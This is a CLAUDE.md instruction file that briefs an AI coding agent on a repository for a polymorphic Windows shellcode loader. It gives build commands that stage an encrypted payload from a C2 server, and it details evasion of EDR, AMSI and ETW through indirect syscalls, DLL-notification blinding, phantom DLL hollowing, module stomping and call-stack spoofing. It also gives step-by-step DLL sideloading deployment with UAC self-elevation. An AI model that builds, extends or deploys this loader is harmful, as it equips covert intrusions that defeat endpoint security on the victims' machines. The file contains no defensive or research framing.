# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Build Commands

```bash
# Step 1: Encrypt shellcode and generate Payload.h (required before every build)
python Encrypt.py <shellcode.bin> --url https://<C2_IP>:<PORT>/payload.dat

# Step 2a: Compile as EXE (default)
build.bat                                    # no UAC prompt
build.bat uac                                # embeds requireAdministrator manifest

# Step 2b: Compile as DLL sideload variant
python SideloadGen.py <target.dll> [--rename <new_name>] [--exe <host.exe>]
build.bat sideload [output_name.dll]         # no elevation
build.bat sideload [output_name.dll] uac     # self-relaunch for UAC

# Debug mode: uncomment '#define DEBUG' in Common.h before building
# Go/Sliver shellcode: uncomment '#define RWX_SHELLCODE' in Common.h
```

Build pipeline (EXE): `ml64 AsmStub.asm` → `cl *.c AsmStub.obj` → `python Mutate.py WUAssistant.exe`

Build pipeline (DLL sideload): `SideloadGen.py <target.dll>` → `ml64 AsmStub.asm` → `cl /DBUILD_DLL *.c Sideload.c AsmStub.obj /DLL` → `python Mutate.py sideload.dll`

Compiler flags: `/O1 /GS- /NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS` (EXE) or `/ENTRY:DllMain /DLL` (sideload). `uac` flag adds `/MANIFEST:EMBED /MANIFESTUAC` (EXE) or `/DREQUIRE_ELEVATION` (DLL).

## Architecture

CRT-free x64 Windows shellcode loader with polymorphic builds. Every run of `Encrypt.py` + `build.bat` produces a binary with a unique hash.

### Execution Flow (main.c)

```
IatCamouflage → AntiAnalysis → InitializeNtSyscalls → InitializeWinApis
→ BlindDllNotifications → PatchlessAmsiEtw (VEH + HW breakpoints) → BruteForceDecryption
→ DownloadPayload → ChaskeyCtrDecrypt → [DecompressPayload]
→ PhantomDllHollow → ModuleStomp → NtAllocateVirtualMemory (3-tier fallback)
→ CleanupEvasion (remove VEH, wipe keys/URLs)
→ FindCallGadget → SetSpoofTarget(target, gadget)
→ TpAllocWork(SpoofCallback) → TpPostWork → NtDelayExecution
```

Each step returns FALSE on failure and the loader exits silently. Anti-analysis is skipped when `DEBUG` is defined.

### Module Responsibilities

- **Syscalls.h/.c + AsmStub.asm** — Indirect syscall engine with gadget pool randomization. Extracts SSN from ntdll by pattern-matching `4C 8B D1 B8 XX XX 00 00`. Falls back to neighboring stubs if hooked. `CollectSyscallGadgets()` scans ntdll's executable sections for all `0F 05 C3` (syscall;ret) patterns and stores up to 64 in a pool. `GetRandomGadget()` picks one per call via `RDTSC`, preventing EDR from whitelisting a single gadget address. `SET_SYSCALL()` macro configures SSN + random gadget before `RunSyscall()`. AsmStub also contains `SpoofCallback` (thread pool callback with call gadget injection) and `SetSpoofTarget(target, gadget)`.
- **WinApi.c** — PEB walking to find kernel32, then hash-based export resolution (Jenkins One-at-a-Time 32-bit). Also provides CRT replacements (`memset`/`memcpy` via intrinsics) and IAT camouflage.
- **Evasion.c** — Four evasion components: (1) `BlindDllNotifications` — removes all LdrRegisterDllNotification callbacks by registering a dummy callback, walking the doubly-linked list to find the sentinel head (inside ntdll address range), unlinking all EDR entries, then unregistering the dummy. Blinds EDR to subsequent LoadLibrary calls. (2) Patchless AMSI/ETW bypass — VEH handler + hardware breakpoints (DR0=EtwEventWrite, DR1=AmsiScanBuffer) via `RtlCaptureContext` + `NtContinue` (avoids ETW-TI). VEH intercepts `STATUS_SINGLE_STEP` and returns benign values. Zero code bytes modified. (3) `CleanupEvasion()` — removes VEH handler, clears debug registers, wipes evasion state. (4) `InstallExitHook()` (BUILD_DLL only) — patches `RtlExitUserProcess` in ntdll with an infinite PAUSE loop, called from DllMain before the loader runs. Prevents the entire ExitProcess flow: no thread termination (`NtTerminateProcess(NULL)`), no DLL unloading (`LdrShutdownProcess`), no process termination (`NtTerminateProcess(-1)`). Without this, `LdrShutdownProcess` would call `DLL_PROCESS_DETACH` which cleans up winsock/winhttp state and kills C2 comms. Anti-analysis: PEB debugger flag, NtGlobalFlag, CPU count, RDTSC timing.
- **Crypt.c** — Chaskey-12 ARX block cipher in CTR mode (replaces RC4/SystemFunction032). No S-boxes, no lookup tables, pure ALU — avoids RC4 signature detection. LZNT1 decompression via `RtlDecompressBuffer` (ntdll). Brute-forces 1 byte to recover the protected key using a known hint byte.
- **Staging.c** — HTTPS download via dynamically-loaded WinINet. URL parsing via `InternetCrackUrlA` (replaces manual parser). Self-signed cert bypass: first `HttpSendRequest` fails → set `SECURITY_FLAG_IGNORE_UNKNOWN_CA` on **same handle** → retry. Wipes URL/host data from stack after use.
- **Stomper.c** — Three components: (1) `PhantomDllHollow` — opens sacrificial DLL in an NTFS transaction (`CreateFileTransactedA`), writes shellcode at .text raw offset, creates SEC_IMAGE section (`NtCreateSection`), rolls back transaction (on-disk file unchanged), maps section (`NtMapViewOfSection`). EDR can't verify memory against disk because FILE_OBJECT retains transacted data. Requires elevated privileges for System32 files. (2) `ModuleStomp` — LoadLibrary + overwrite .text section with shellcode. Falls back if shellcode exceeds .text size. (3) `FindCallGadget` — scans a module's executable sections for `FF D3` (call rbx) gadget, used by call stack spoofing to inject a legitimate DLL frame.
- **Payload.h** — Auto-generated by `Encrypt.py`. Contains `#define` macros for XKEY_0..XKEY_3 (4-byte rotating XOR key), all XOR-encoded strings (`XSTR_*`), encoded URL (`INIT_ENCODED_URL`), protected Chaskey key (`INIT_PROTECTED_KEY`), Chaskey-CTR nonce (`INIT_CHASKEY_NONCE`), and compression flag (`USE_COMPRESSION`). **Never edit manually.**
- **Sideload.c** — DLL sideloading entry point (compiled only with `BUILD_DLL`). `DllMain` finds ntdll via PEB walk, patches `RtlExitUserProcess` (prevents host exit killing C2), resolves `TpAllocWork`/`TpPostWork` using JOAAT hashes, and queues `SideloadWorker` to a thread pool thread. With `REQUIRE_ELEVATION`: worker checks admin via `NtQueryInformationToken`, relaunches host EXE elevated via `ShellExecuteA("runas")` if needed, then self-terminates; elevated instance pins DLL (`LdrAddRefDll`) and runs `Main()`. Without `REQUIRE_ELEVATION`: worker pins DLL and runs `Main()` directly. Deferred execution avoids Loader Lock; host application continues normally.
- **Sideload.h** — Auto-generated by `SideloadGen.py`. Contains `#pragma comment(linker, "/export:...")` directives that forward every export from the proxy DLL to the renamed original DLL. The PE loader handles forwarding natively — no proxy code runs for legitimate API calls. **Never edit manually.**
- **SideloadGen.py** — Parses a target DLL's PE export table (manual struct parsing, no external dependencies) and generates `Sideload.h` with export forwarding pragmas. Supports named exports and ordinal-only exports. Extracts and clones VS_VERSIONINFO into `Sideload.rc`. Usage: `python SideloadGen.py <target.dll> [--rename <name>] [--exe <host.exe>]`.

### Polymorphic Build System

`Encrypt.py` randomizes per run:
- **XKEY_0..XKEY_3** (4-byte rotating XOR key for 25+ DLL/API strings) — each byte picked from values that won't produce null bytes at its positions
- **Chaskey key** (16 random bytes) — protected with `(Key[i] + i) ^ random_byte`
- **Chaskey nonce** (12 random bytes) — stored directly in Payload.h
- **URL XOR key** — separate random key for staging URL
- **LZNT1 compression** — payload is compressed before encryption (via `RtlCompressBuffer`); decompressed at runtime via `RtlDecompressBuffer`

`Mutate.py` randomizes post-build:
- PE TimeDateStamp, Rich header, section padding, checksum

### Key Design Constraints

- **No CRT**: Uses `__movsb`/`__stosb` intrinsics. `memset`/`memcpy` are manually implemented in WinApi.c with `#pragma function()`. Stack frames must stay under 4096 bytes to avoid `__chkstk` dependency.
- **No kernel32 for execution**: Memory allocation/protection via indirect syscalls; execution via ntdll thread pool (`TpAllocWork`/`TpPostWork`); waiting via `NtDelayExecution` indirect syscall. No `NtCreateThreadEx` — avoids kernel `PsSetCreateThreadNotifyRoutine` callback.
- **W^X by default**: Memory is `PAGE_EXECUTE_READ` unless `RWX_SHELLCODE` is defined (needed for Go-based shellcode like Sliver that writes to its own pages).
- **Stack-based string decoding**: `DEOBF()` macro XOR-decodes byte arrays in place on the stack using a 4-byte rotating key. The null terminator `0x00` is stored raw (not encoded), so each key byte must not equal any character at its corresponding positions in the plaintext strings.
- **All WinINet/ktmw32 APIs resolved dynamically**: `LoadLibraryA` + `GetProcAddress` obtained via PEB hash walking, then used to resolve all other APIs. File I/O APIs (ReadFile, WriteFile, SetFilePointer) resolved via `FetchExportAddress` with JOAAT hashes.
- **Post-execution cleanup**: Keys, URLs, VEH handlers, and decoded strings are wiped from memory before shellcode execution to reduce forensic footprint.

### Compile-Time Flags (Common.h)

| Flag | Effect |
|------|--------|
| `DEBUG` | Enables debug logging to `debug.log` |
| `RWX_SHELLCODE` | Uses `PAGE_EXECUTE_READWRITE` for Go/Sliver shellcode |
| `BUILD_DLL` | DLL sideload build (set automatically by `build.bat sideload`) |
| `REQUIRE_ELEVATION` | DLL self-relaunch UAC elevation (set by `build.bat sideload ... uac`) |

### Hash Constants (Common.h)

Syscall and API function names are identified by JOAAT hashes, not strings. When adding a new syscall or API, compute the hash with `HashStringJenkinsOneAtATime32BitA()` and add the `#define` to Common.h.

### DLL Sideloading

DLL sideloading places a proxy DLL alongside a legitimate signed executable. When the host EXE runs, it loads the proxy DLL (thinking it's the real one). The proxy forwards all legitimate exports to the renamed original DLL via PE export forwarding, while the loader pipeline runs asynchronously on a thread pool thread.

```bash
# Step 1: Generate export forwarding for target DLL
python SideloadGen.py C:\Windows\System32\<target>.dll --exe <host>.exe

# Step 2: Encrypt shellcode (same as EXE build)
python Encrypt.py shellcode.bin --url https://c2.example.com/payload.dat

# Step 3: Build DLL
build.bat sideload <target>.dll          # no UAC
build.bat sideload <target>.dll uac      # with UAC self-elevation
```

Deployment:
1. Rename the real `<target>.dll` to `<target>_orig.dll`
2. Place the built `<target>.dll` (proxy) alongside the host executable
3. Place `<target>_orig.dll` in the same directory
4. Upload `data.enc` to the C2 server
5. Run the host executable

DLL sideload execution flow:
```
Host EXE loads proxy DLL → DllMain (DLL_PROCESS_ATTACH)
→ PEB walk → find ntdll → InstallExitHook (patch RtlExitUserProcess)
→ resolve TpAllocWork/TpPostWork → TpAllocWork(SideloadWorker) → TpPostWork → return TRUE
→ [Host app continues normally, ExitProcess blocked by exit hook]
→ SideloadWorker fires on thread pool:
  → [REQUIRE_ELEVATION] IsElevated? → no: ShellExecuteA "runas" + NtTerminateProcess self
  → [REQUIRE_ELEVATION] elevated instance: LdrAddRefDll pin → Main()
  → [no REQUIRE_ELEVATION] LdrAddRefDll pin → Main()
→ [Full loader pipeline: evasion → download → decrypt → inject → execute]
```

### Adding a New Obfuscated String

1. Add the plaintext to `OBFUSCATED_STRINGS` dict in `Encrypt.py`
2. Use the corresponding `XSTR_*` define in the C code: `BYTE x[] = XSTR_NAME; DEOBF(x);`
3. Re-run `Encrypt.py` to regenerate `Payload.h`
